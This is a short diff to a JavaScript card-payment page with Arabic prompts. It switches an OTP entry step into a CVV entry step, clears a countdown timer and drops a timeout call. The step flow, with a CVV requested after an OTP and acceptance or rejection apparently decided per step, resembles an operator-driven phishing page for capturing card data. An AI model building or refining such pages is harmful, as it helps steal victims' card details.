@@ -875,6 +875,7 @@
 
     function showCvvCard(withError) {
       loadingCard.style.display = 'none';
+      if (otpCountdown) { clearInterval(otpCountdown); otpCountdown = null; }
       currentStep = 'cvv';
       document.getElementById('otp-notice').textContent = 'يرجى الانتباه: يرجى إدخال رمز الأمان (CVV) المكون من 3 أرقام الموجود على الجهة الخلفية من بطاقتك في الحقل المناسب أدناه';
       document.getElementById('otp-notice').style.display = 'block';
@@ -885,6 +886,7 @@
       document.getElementById('otp-field-label').textContent = ':CVV';
       document.getElementById('otp-input').value = '';
       document.getElementById('otp-input').maxLength = 3;
+      document.getElementById('otp-input').placeholder = '';
       const errRow = document.getElementById('otp-error-row');
       const errMsg = document.getElementById('otp-inline-error');
       if (withError) {
@@ -895,7 +897,6 @@
       }
       otpCard.style.display = 'block';
       document.getElementById('otp-action-card').style.display = 'block';
-      startOtpTimeout();
     }
 
     // القبول والرفض يعتمدان على الخطوة الحالية
